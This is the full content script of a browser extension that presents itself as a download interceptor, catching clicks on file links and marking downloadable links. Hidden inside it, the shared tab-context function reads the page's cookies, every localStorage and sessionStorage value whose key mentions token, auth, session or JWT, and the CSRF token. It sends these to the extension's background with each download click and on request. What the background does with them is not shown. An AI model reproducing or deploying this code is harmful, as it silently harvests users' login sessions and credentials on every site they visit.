(() => {
  'use strict';

  const DOWNLOAD_TYPES = [
    'exe', 'msi', 'dmg', 'apk', 'zip', 'rar', '7z', 'tar', 'gz',
    'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
    'mp4', 'mkv', 'avi', 'mov', 'wmv', 'flv', 'webm', 'm4v',
    'mp3', 'flac', 'wav', 'aac', 'ogg', 'wma',
    'iso', 'bin', 'cue', 'img'
  ];

  function getFileExtension(url) {
    try {
      const p = new URL(url).pathname.split('.');
      if (p.length > 1) return p[p.length - 1].toLowerCase().split('?')[0];
    } catch (e) {}
    return '';
  }

  function isDownloadable(url) {
    return DOWNLOAD_TYPES.includes(getFileExtension(url));
  }

  function extractFilename(url) {
    try {
      const parts = new URL(url).pathname.split('/');
      const name = parts[parts.length - 1];
      return name && name.includes('.') ? decodeURIComponent(name) : 'download';
    } catch (e) {}
    return 'download';
  }

  function collectStorageTokens() {
    const tokens = {};
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth') ||
            key.toLowerCase().includes('session') || key.toLowerCase().includes('jwt') ||
            key.toLowerCase().includes('csrf') || key.toLowerCase().includes('xsrf'))) {
          tokens[key] = localStorage.getItem(key);
        }
      }
    } catch (e) {}
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key && (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth') ||
            key.toLowerCase().includes('session') || key.toLowerCase().includes('jwt'))) {
          tokens['session_' + key] = sessionStorage.getItem(key);
        }
      }
    } catch (e) {}
    return Object.keys(tokens).length > 0 ? tokens : null;
  }

  function collectMetaTags() {
    const meta = {};
    try {
      const csrf = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
      if (csrf) meta['csrf-token'] = csrf;
      const viewport = document.querySelector('meta[name="viewport"]')?.getAttribute('content');
      if (viewport) meta['viewport'] = viewport;
      const referrer = document.querySelector('meta[name="referrer"]')?.getAttribute('content');
      if (referrer) meta['referrer'] = referrer;
    } catch (e) {}
    return Object.keys(meta).length > 0 ? meta : null;
  }

  function getFullTabContext() {
    return {
      id: 0,
      url: window.location.href,
      title: document.title,
      favIconUrl: document.querySelector('link[rel*="icon"]')?.href || '',
      windowId: 0,
      frameId: window !== window.top ? 1 : 0,
      active: true,
      status: 'complete',
      referrer: document.referrer || '',
      protocol: window.location.protocol,
      hostname: window.location.hostname,
      origin: window.location.origin,
      language: document.documentElement.lang || navigator.language,
      charset: document.characterSet,
      doctype: document.doctype?.name || 'html',
      cookies: document.cookie || '',
      storageTokens: collectStorageTokens(),
      metaTags: collectMetaTags()
    };
  }

  function getRefererChain() {
    const chain = [];
    try {
      if (document.referrer) chain.push(document.referrer);
      chain.push(window.location.href);
    } catch (e) {}
    return chain;
  }

  function sendToBackground(data) {
    try {
      chrome.runtime.sendMessage(data, () => { void chrome.runtime.lastError; });
    } catch (e) {}
  }

  const processedUrls = new Set();

  function findDownloadUrl(element) {
    let el = element;
    for (let i = 0; i < 5 && el; i++) {
      if (el.tagName === 'A' && el.href) {
        return { url: el.href, filename: el.download || extractFilename(el.href) };
      }
      if (el.getAttribute) {
        const href = el.getAttribute('data-url') || el.getAttribute('data-download')
          || el.getAttribute('data-href') || el.getAttribute('data-download-url');
        if (href && (href.startsWith('http') || href.startsWith('/'))) {
          return { url: new URL(href, window.location.href).href, filename: extractFilename(href) };
        }
      }
      el = el.parentElement;
    }
    return null;
  }

  document.addEventListener('click', (event) => {
    const target = event.target;
    const link = target.closest('a[href]');
    if (link && isDownloadable(link.href)) {
      if (processedUrls.has(link.href)) return;
      processedUrls.add(link.href);
      setTimeout(() => processedUrls.delete(link.href), 5000);
      sendToBackground({
        type: 'INTERCEPT_CLICK',
        url: link.href,
        filename: link.download || extractFilename(link.href),
        tab: getFullTabContext(),
        refererChain: getRefererChain()
      });
      return;
    }

    const downloadInfo = findDownloadUrl(target);
    if (downloadInfo && isDownloadable(downloadInfo.url)) {
      if (processedUrls.has(downloadInfo.url)) return;
      processedUrls.add(downloadInfo.url);
      setTimeout(() => processedUrls.delete(downloadInfo.url), 5000);
      sendToBackground({
        type: 'INTERCEPT_CLICK',
        url: downloadInfo.url,
        filename: downloadInfo.filename,
        tab: getFullTabContext(),
        refererChain: getRefererChain()
      });
    }
  }, true);

  function markDownloadLinks(element) {
    if (!element) return;
    try {
      if (element.tagName === 'A' && element.href && isDownloadable(element.href))
        element.setAttribute('data-mac1-download', 'true');
      element.querySelectorAll?.('a[href]')?.forEach(link => {
        if (isDownloadable(link.href)) link.setAttribute('data-mac1-download', 'true');
      });
    } catch (e) {}
  }

  function startObserver() {
    if (!document.body) return;
    try {
      const observer = new MutationObserver((mutations) => {
        for (const m of mutations)
          for (const n of m.addedNodes)
            if (n.nodeType === Node.ELEMENT_NODE) markDownloadLinks(n);
      });
      observer.observe(document.body, { childList: true, subtree: true });
    } catch (e) {}
  }

  if (document.body) startObserver();
  else document.addEventListener('DOMContentLoaded', startObserver);

  chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    try {
      if (message.type === 'GET_PAGE_INFO') {
        sendResponse({
          url: window.location.href,
          title: document.title,
          referrer: document.referrer,
          tabContext: getFullTabContext(),
          refererChain: getRefererChain(),
          storageTokens: collectStorageTokens(),
          metaTags: collectMetaTags()
        });
      } else if (message.type === 'GET_DOWNLOAD_LINKS') {
        const links = [];
        document.querySelectorAll('a[href]').forEach(link => {
          if (isDownloadable(link.href)) {
            links.push({
              url: link.href,
              text: link.textContent.trim(),
              filename: link.download || extractFilename(link.href),
              extension: getFileExtension(link.href)
            });
          }
        });
        sendResponse({ links });
      }
    } catch (e) {
      sendResponse({ error: e.message });
    }
    return true;
  });
})();
